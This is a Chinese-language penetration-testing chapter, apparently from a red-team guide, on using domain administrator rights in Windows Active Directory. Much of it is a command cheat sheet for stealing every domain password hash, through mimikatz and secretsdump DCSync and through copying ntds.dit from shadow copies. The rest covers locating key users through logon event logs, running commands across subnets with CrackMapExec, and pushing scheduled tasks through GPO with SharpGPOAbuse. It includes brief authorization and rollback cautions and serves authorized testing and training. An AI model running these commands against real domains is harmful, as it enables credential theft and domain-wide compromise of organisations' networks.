# 第13章 域管权限利用分析

## 获取域哈希

- 复制 `ntds.dit` + SYSTEM 注册表后离线解析。
- `ntdsutil` 快照、`vssadmin` 卷影副本。
- DCSync：mimikatz `lsadump::dcsync` 或 secretsdump。
- DCSync 流量大，优先按用户或 `-just-dc-ntlm` 限制范围。

```cmd
ntdsutil "snapshot" "activate instance ntds" "create" "quit" "quit"
vssadmin create shadow /for=c:
reg save HKLM\SYSTEM C:\ProgramData\system.hiv
```

## 日志定位用户

- 4624 登录、4768 TGT、4776 NTLM 验证。
- PowerShell `Get-WinEvent`、`wevtutil`、FullEventLogView。
- 通过登录 IP、工作站名、时间定位关键业务人员。

## 批量命令

- CrackMapExec 支持 smbexec、wmiexec、atexec 等方法。
- 批量操作会放大流量和影响，先做小范围验证。

## 域分发

- 登录脚本、GPO 软件安装、SharpGPOAbuse。
- 严格记录 GPO 修改，测试完成后删除或还原。
- 不得向未授权计算机分发程序。
## 命令速查

### DCSync

```cmd
mimikatz.exe "log" "lsadump::dcsync /domain:<DOMAIN> /all /csv /dc:<DC_FQDN>" "exit"
mimikatz.exe "log" "lsadump::dcsync /domain:<DOMAIN> /user:administrator /dc:<DC_FQDN>" "exit"
```

```bash
secretsdump.py <DOMAIN>/<USER>:<PASSWORD>@<DC>
secretsdump.py <DOMAIN>/<USER>@<DC> -hashes :<NTHASH> -just-dc-ntlm
```

### ntds.dit / SYSTEM

```cmd
ntdsutil "snapshot" "activate instance ntds" "create" "quit" "quit"
vssadmin create shadow /for=c:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<N>\windows\NTDS\ntds.dit C:\ProgramData\ntds.dit
reg save HKLM\SYSTEM C:\ProgramData\system.hiv
```

```bash
secretsdump.py -ntds ntds.dit -system system.hiv LOCAL
```

### 日志定位

```powershell
Get-WinEvent -LogName Security -FilterXPath "*[System[(EventID=4624 or EventID=4768 or EventID=4776)]]" -MaxEvents 200
wevtutil qe Security /f:text /q:"*[System[(EventID=4624 or EventID=4768)]]"
```

### 批量/GPO

```bash
crackmapexec smb <CIDR> -d <DOMAIN> -u <USER> -p <PASSWORD> -x whoami
SharpGPOAbuse.exe --AddComputerTask --TaskName <TASK> --Author <DOMAIN>\<USER> --Command cmd.exe --Arguments "/c whoami > C:\ProgramData\out.txt" --GPOName <GPO> --Force
```

提示：GPO、密码修改、计划任务等域分发操作影响面大，必须事先备份并记录回滚。
